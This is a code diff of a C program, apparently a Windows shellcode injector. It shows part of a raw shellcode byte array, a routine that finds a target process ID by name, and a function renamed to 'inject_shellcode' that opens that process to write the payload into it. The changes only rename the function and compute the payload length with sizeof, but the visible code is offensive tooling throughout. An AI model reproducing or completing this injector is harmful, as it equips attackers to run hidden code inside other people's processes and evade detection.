@@ -38,7 +38,7 @@ unsigned char payload[] =
     "\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
     "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";
 
-unsigned int payload_len = 434;
+size_t payload_len = sizeof(payload);
 
 // Find PID from a Process Name
 DWORD find_pid(const char* procname) {
@@ -84,7 +84,7 @@ DWORD find_pid(const char* procname) {
 }
 
 // Inject payload into process
-int inject_proc(DWORD pid) {
+int inject_shellcode(DWORD pid) {
     DWORD bWritten = 0;
 
     // Opens an existing local process object.
@@ -179,7 +179,7 @@ int main(void) {
 
     printf("[i] %s: %d\n", TARGET, pid);
 
-    int result = inject_proc(pid);
+    int result = inject_shellcode(pid);
     if (result < 0) {
         fprintf(stderr, "[!] Failed to inject payload\n");
         return -2;
